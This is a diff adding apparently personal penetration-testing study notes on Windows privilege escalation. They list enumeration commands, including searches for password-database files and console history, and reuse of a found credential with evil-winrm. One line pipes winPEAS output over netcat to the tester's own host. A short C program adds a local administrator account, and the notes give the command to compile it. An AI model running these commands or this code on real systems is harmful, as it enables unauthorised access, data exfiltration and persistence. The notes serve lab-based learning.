@@ -1,0 +1,149 @@
+steps.WindowsPE
+
+
+
+https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/privileges-abuse/seimpersonate/potatoes
+
+
+(P475)
+The SID string consists of different parts, delimited by “-”, and represented by the placeholders “S”, 
+“R”, “X”, and “Y” in the following listing. This representation is the fundamental structure of a SID.
+S-R-X-Y 
+
+S-1-0-0                       Nobody         
+S-1-1-0                       Everybody 
+S-1-5-11                      Authenticated Users 
+S-1-5-18                      Local System 
+S-1-5-domainidentifier-500    Administrator
+
+
+
+whoami
+whoami /groups
+net user <user>  #look up group member this
+systeminfo
+ipconfig /all
+route print 
+netstat -ano  #active connections witjh processID
+where ssh
+Get-LocalUser
+Get-LocalGroup  # get defined group names 
+Get-LocalGroupMember (groupname)
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue   # fowershell search for file (keypass) 
+Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\Users\<user>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue 
+Get-History 
+(Get-PSReadlineOption).HistorySavePath    # use type to view PS console history (p493) Start-Transcript
+Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+Restart-Service
+icacls "fileName" 
+schtasks /query /fo LIST /v     #schceduled tasks 
+
+F  -Full access
+M  - Modify access
+RX - Read and execute access
+R  - Read-only access
+W  - Write-only access
+
+
+Get-ACL "filename" 
+
+
+
+https://github.com/antonioCoco/RunasCs/releases
+
+
+Things
+
+Log on as a batch job -> user can schedule a tast
+
+B64 reverese shell encode 
+
+./pen-200/shell/encodeIt.ps1
+
+
+Making use of found creds with powershell
+
+$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force 
+$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force 
+$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password) 
+Enter-PSSession -ComputerName <target> -Credential $cred
+
+works better with 
+
+evil-winrm -i <target> -u daveadmin -p "qwertqwertqwert123\!\!"      #must escape the bang!
+
+Automated Enumeration
+
+Let's give winPEASx64.exe a try and see it it is better than the bat
+does all the manaul enumaeration and much more 
+
+.\winpeasx64.exe | nc64 $myIP 1221
+
+my side 
+
+nc -lvp > WP.(lastOctet)
+
+
+Service binaries - if you can replace it with an exe that creates user p(503 )
+
+
+Service DLL Hijacking (p508)
+
+Is there a missing DLL
+
+
+Can we put something in place that would load before real DLL 
+$env:path
+
+
+Unquoted Service Paths  (p515)
+
+C:\Program  Files\My Program\My Service\service.exe. 
+
+it will use the following order to try to start the executable file due to the spaces in the path. 
+C:\Program.exe 
+C:\Program Files\My.exe 
+C:\Program Files\My Program\My.exe 
+C:\Program Files\My Program\My service\service.exe
+
+
+
+
+Scheduled Task (p522)
+
+schtasks /query /fo LIST /v 
+
+
+
+Exploits
+
+SeImpersonatePrivilege   often the vector
+
+PrintSpoofer
+godPotato   
+
+
+++--------------
+adduser.c
+
+#include <stdlib.h> 
+ 
+int main () 
+{ 
+  int i; 
+   
+  i = system ("net user beed2112 scuba@5150 /add"); 
+  i = system ("net localgroup administrators beed2112 /add"); 
+   
+  return 0; 
+}
+
+++-------------------------------------------------------
+
+compile it 
+x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+
+sudo apt-get install --reinstall build-essentia
+cd 
